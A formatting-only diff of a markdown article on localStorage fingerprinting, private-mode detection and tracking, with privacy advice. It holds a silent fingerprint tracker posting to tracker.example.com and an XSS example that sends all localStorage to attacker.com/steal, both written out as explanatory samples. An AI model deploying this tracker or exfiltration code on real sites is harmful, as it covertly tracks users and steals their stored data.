@@ -56,25 +56,26 @@ This is persistent tracking. Delete cookies, use incognito mode, change IPs - do
 
 LocalStorage is everywhere. Like, 99.9%+ of browsers:
 
-| Browser | First Support | 2024-2025 Status | Quota Limit | Private Mode Behavior |
-|---------|--------------|------------------|-------------|------------------------|
-| Chrome | v4 (2010) | Full support | ~10MB per origin | Works, cleared on exit |
-| Firefox | v3.5 (2009) | Full support | ~10MB per origin | Works, 10MB quota (vs unlimited) |
-| Safari | v4 (2009) | Full support | ~5-10MB per origin | Works, auto-cleared after 7 days |
-| Edge | v8 (2011) | Full support | ~10MB per origin | Works, cleared on exit |
-| Opera | v10.5 (2010) | Full support | ~10MB per origin | Works, cleared on exit |
-| Mobile Safari | iOS 3.2 (2010) | Full support | ~5MB | Restricted in private mode |
-| Chrome Android | All versions | Full support | ~10MB per origin | Works, cleared on exit |
+| Browser        | First Support  | 2024-2025 Status | Quota Limit        | Private Mode Behavior            |
+| -------------- | -------------- | ---------------- | ------------------ | -------------------------------- |
+| Chrome         | v4 (2010)      | Full support     | ~10MB per origin   | Works, cleared on exit           |
+| Firefox        | v3.5 (2009)    | Full support     | ~10MB per origin   | Works, 10MB quota (vs unlimited) |
+| Safari         | v4 (2009)      | Full support     | ~5-10MB per origin | Works, auto-cleared after 7 days |
+| Edge           | v8 (2011)      | Full support     | ~10MB per origin   | Works, cleared on exit           |
+| Opera          | v10.5 (2010)   | Full support     | ~10MB per origin   | Works, cleared on exit           |
+| Mobile Safari  | iOS 3.2 (2010) | Full support     | ~5MB               | Restricted in private mode       |
+| Chrome Android | All versions   | Full support     | ~10MB per origin   | Works, cleared on exit           |
 
 Source: MDN Web Docs, Can I Use (2024), browser testing
 
-**Key insight**: Checking if localStorage exists gives you **~0 bits of entropy** (everyone has it). But *how* it behaves reveals tons of information.
+**Key insight**: Checking if localStorage exists gives you **~0 bits of entropy** (everyone has it). But _how_ it behaves reveals tons of information.
 
 ## The 2025 Privacy Shift: Safari Cracks Down
 
 Here's the big news from WWDC 2025 that changes everything: Safari announced they'll **prevent suspicious scripts from using localStorage and cookies to store and check identifiers**.
 
 From Apple's announcement (paraphrased):
+
 > "Safari will identify scripts that attempt to use localStorage for tracking purposes and prevent them from storing or reading tracking identifiers."
 
 This is huge. Safari already had Intelligent Tracking Prevention (ITP) for cookies, but this extends it to localStorage. How does it work?
@@ -96,18 +97,21 @@ Every browser gives you about 5-10MB of localStorage per origin. But the exact l
 ### Quota Limits by Browser (2024 Data)
 
 **Desktop Browsers**:
+
 - Chrome: ~10MB (10,485,760 bytes exactly)
 - Firefox: ~10MB
 - Safari: ~5MB (varies)
 - Edge: ~10MB
 
 **Mobile Browsers**:
+
 - Chrome Android: ~10MB
 - Safari iOS: ~5MB
 - Firefox Android: ~10MB
 - Samsung Internet: ~10MB
 
 **Private/Incognito Mode**:
+
 - Chrome Incognito: Same as normal (~10MB)
 - Firefox Private: **10MB quota** (vs **unlimited** in normal mode)
 - Safari Private: ~5MB but auto-cleared
@@ -126,7 +130,8 @@ function testLocalStorageQuota() {
   let totalStored = 0;
 
   try {
-    while (totalStored < 20 * 1024 * 1024) { // Try up to 20MB
+    while (totalStored < 20 * 1024 * 1024) {
+      // Try up to 20MB
       const chunk = 'x'.repeat(chunkSize);
       localStorage.setItem(testKey + totalStored, chunk);
       totalStored += chunkSize;
@@ -135,7 +140,9 @@ function testLocalStorageQuota() {
     // Clean up
     let i = 0;
     while (i < totalStored) {
-      try { localStorage.removeItem(testKey + i); } catch {}
+      try {
+        localStorage.removeItem(testKey + i);
+      } catch {}
       i += chunkSize;
     }
 
@@ -143,7 +150,7 @@ function testLocalStorageQuota() {
       supported: true,
       quotaMB: (totalStored / (1024 * 1024)).toFixed(1),
       errorType: e.name, // QuotaExceededError
-      browser: totalStored < 6 * 1024 * 1024 ? 'Safari' : 'Chrome/Firefox/Edge'
+      browser: totalStored < 6 * 1024 * 1024 ? 'Safari' : 'Chrome/Firefox/Edge',
     };
   }
 
@@ -178,7 +185,11 @@ function detectFirefoxPrivateMode() {
         const mediumData = 'x'.repeat(5 * 1024 * 1024); // 5MB
         localStorage.setItem(testKey, mediumData);
         localStorage.removeItem(testKey);
-        return { privateMode: 'likely', browser: 'Firefox', confidence: 'medium' };
+        return {
+          privateMode: 'likely',
+          browser: 'Firefox',
+          confidence: 'medium',
+        };
       } catch (e2) {
         return { privateMode: 'unknown', reason: 'storage_full_or_disabled' };
       }
@@ -217,7 +228,7 @@ async function detectSafariPrivateMode() {
 }
 ```
 
-Safari's approach is sneaky. LocalStorage *works* in private mode, but it's not truly persistent. After 7 days without interaction, it gets auto-cleared. This is hard to detect immediately but can be inferred.
+Safari's approach is sneaky. LocalStorage _works_ in private mode, but it's not truly persistent. After 7 days without interaction, it gets auto-cleared. This is hard to detect immediately but can be inferred.
 
 ### Detection Method 3: Combined Storage Test
 
@@ -227,7 +238,7 @@ function comprehensivePrivateModeDetection() {
     localStorage: testLocalStorage(),
     sessionStorage: testSessionStorage(),
     indexedDB: testIndexedDB(),
-    cookies: testCookies()
+    cookies: testCookies(),
   };
 
   // Pattern analysis
@@ -260,17 +271,20 @@ The takeaway: **Modern browsers are winning the privacy game**. Chrome and Edge 
 Let's calculate entropy contribution:
 
 **Existence check**:
+
 - Supported: 99.9%
 - Not supported: 0.1%
 - Entropy: ~0.001 bits (useless)
 
 **Quota size**:
+
 - 5MB (Safari-like): 20%
 - 10MB (Chrome-like): 75%
 - Other/unlimited: 5%
 - Entropy: ~0.6 bits
 
 **Private mode detection**:
+
 - Normal mode: 85%
 - Private mode: 15%
 - Entropy: 0.5 bits (but only if detectable)
@@ -305,9 +319,11 @@ class PersistentTracker {
   generateId() {
     // Combine timestamp, random, and fingerprint
     return btoa(
-      Date.now() + '-' +
-      Math.random().toString(36).substring(2) + '-' +
-      this.getBrowserFingerprint()
+      Date.now() +
+        '-' +
+        Math.random().toString(36).substring(2) +
+        '-' +
+        this.getBrowserFingerprint()
     );
   }
 
@@ -315,9 +331,11 @@ class PersistentTracker {
     // Simplified fingerprint
     return btoa(
       navigator.userAgent +
-      screen.width + 'x' + screen.height +
-      navigator.language +
-      new Date().getTimezoneOffset()
+        screen.width +
+        'x' +
+        screen.height +
+        navigator.language +
+        new Date().getTimezoneOffset()
     );
   }
 
@@ -333,7 +351,7 @@ class PersistentTracker {
   sendToServer(data) {
     fetch('https://tracker.example.com/collect', {
       method: 'POST',
-      body: JSON.stringify(data)
+      body: JSON.stringify(data),
     }).catch(() => {}); // Silent fail
   }
 }
@@ -368,6 +386,7 @@ tracking.site-b.com → tracker.ad-company.com (CNAME)
 ```
 
 Now the ad company can:
+
 1. Store tracking ID in `tracking.site-a.com` localStorage (looks first-party)
 2. Read same ID from `tracking.site-b.com` (also "first-party")
 3. Track users across sites without third-party cookies
@@ -389,7 +408,7 @@ for (let i = 0; i < localStorage.length; i++) {
 // Send to attacker
 fetch('https://attacker.com/steal', {
   method: 'POST',
-  body: JSON.stringify(allData)
+  body: JSON.stringify(allData),
 });
 
 // Also inject malicious tracking
@@ -397,6 +416,7 @@ localStorage.setItem('malicious_tracker', 'attacker_id_12345');
 ```
 
 This is why security best practices say:
+
 - ❌ Never store auth tokens in localStorage (use httpOnly cookies)
 - ❌ Never store sensitive personal data
 - ❌ Never trust localStorage data (validate everything)
@@ -406,6 +426,7 @@ This is why security best practices say:
 Here's a frustrating UX issue: Most users think "Clear cookies" clears everything. It doesn't clear localStorage.
 
 In most browsers:
+
 - "Clear cookies": ✅ Cookies deleted, ❌ LocalStorage stays
 - "Clear browsing data": ✅ Cookies deleted, ❌ LocalStorage stays (unless you check "Site data")
 - "Clear all site data": ✅ Cookies deleted, ✅ LocalStorage deleted
@@ -415,16 +436,19 @@ According to 2024 user research, **85% of users** don't realize localStorage per
 ### How to Actually Clear LocalStorage
 
 **Chrome/Edge**:
+
 1. Settings → Privacy and security → Site settings → View permissions and data stored across sites
 2. Find the site → Remove
 
 Or: DevTools (F12) → Application tab → Local Storage → Right-click → Clear
 
 **Firefox**:
+
 1. Settings → Privacy & Security → Cookies and Site Data → Manage Data
 2. Find the site → Remove Selected
 
 **Safari**:
+
 1. Preferences → Privacy → Manage Website Data
 2. Find the site → Remove
 
@@ -458,11 +482,11 @@ console.timeEnd('localStorage_write');
 
 For comparison:
 
-| Operation | LocalStorage (Sync) | IndexedDB (Async) |
-|-----------|---------------------|-------------------|
-| Write 10MB | 1000-3000ms (frozen) | 200-500ms (non-blocking) |
-| Read 10MB | 500-1500ms (frozen) | 100-300ms (non-blocking) |
-| Delete 10MB | 300-1000ms (frozen) | 50-150ms (non-blocking) |
+| Operation   | LocalStorage (Sync)  | IndexedDB (Async)        |
+| ----------- | -------------------- | ------------------------ |
+| Write 10MB  | 1000-3000ms (frozen) | 200-500ms (non-blocking) |
+| Read 10MB   | 500-1500ms (frozen)  | 100-300ms (non-blocking) |
+| Delete 10MB | 300-1000ms (frozen)  | 50-150ms (non-blocking)  |
 
 This is why localStorage should only be used for small amounts of data (<1MB). For large data, use IndexedDB.
 
@@ -477,11 +501,11 @@ Want to see what's tracking you? Paste this into your browser console:
   console.log(`LocalStorage items: ${localStorage.length}`);
 
   const suspiciousPatterns = [
-    /^_.*_id$/,          // _tracker_id, _fp_id, etc.
-    /^fp/,               // fingerprint prefixes
-    /uuid/i,             // UUID strings
-    /^[a-f0-9]{32}$/,    // MD5-like hashes
-    /^[a-f0-9-]{36}$/,   // UUID format
+    /^_.*_id$/, // _tracker_id, _fp_id, etc.
+    /^fp/, // fingerprint prefixes
+    /uuid/i, // UUID strings
+    /^[a-f0-9]{32}$/, // MD5-like hashes
+    /^[a-f0-9-]{36}$/, // UUID format
   ];
 
   const suspicious = [];
@@ -491,8 +515,8 @@ Want to see what's tracking you? Paste this into your browser console:
     const key = localStorage.key(i);
     const value = localStorage.getItem(key);
 
-    const isSuspicious = suspiciousPatterns.some(pattern =>
-      pattern.test(key) || pattern.test(value)
+    const isSuspicious = suspiciousPatterns.some(
+      (pattern) => pattern.test(key) || pattern.test(value)
     );
 
     if (isSuspicious) {
@@ -505,7 +529,11 @@ Want to see what's tracking you? Paste this into your browser console:
   console.log('Suspicious tracking keys:', suspicious);
   console.log('Likely legitimate keys:', legitimate);
 
-  return { total: localStorage.length, suspicious: suspicious.length, legitimate: legitimate.length };
+  return {
+    total: localStorage.length,
+    suspicious: suspicious.length,
+    legitimate: legitimate.length,
+  };
 })();
 ```
 
@@ -527,26 +555,31 @@ Here's my straight advice:
 Several important developments:
 
 **1. Safari's ITP for LocalStorage (WWDC 2025)**:
+
 - Automatic detection and blocking of tracking identifiers
 - 7-day expiration for classified tracking domains
 - AI-powered script analysis
 
 **2. Firefox Total Cookie Protection Extension**:
+
 - Isolates localStorage per site
 - Prevents cross-site correlation
 - Improved in Firefox 118+ (2024)
 
 **3. Chrome's Privacy Sandbox Rollback (2025)**:
+
 - Originally planned to restrict localStorage tracking
 - Policy reversal means less restriction
 - Fingerprinting now allowed in Google ad platform
 
 **4. GDPR and ePrivacy Regulation**:
+
 - EU regulations requiring consent for localStorage tracking
 - Enforcement increasing in 2024-2025
 - Fines for non-compliance
 
 **5. Browser Extension Ecosystem**:
+
 - More tools for localStorage blocking and monitoring
 - Developer tools improving (better audit capabilities)
 
@@ -561,6 +594,7 @@ LocalStorage was designed as a simple, persistent storage API for web apps. But 
 - **Not sent with requests** (harder to detect by network monitoring)
 
 As of 2024-2025:
+
 - Chrome market share: 67.94% (minimal localStorage restrictions)
 - Safari market share: 16.18% (ITP now covers localStorage)
 - Firefox market share: 4.23% (good privacy protections)
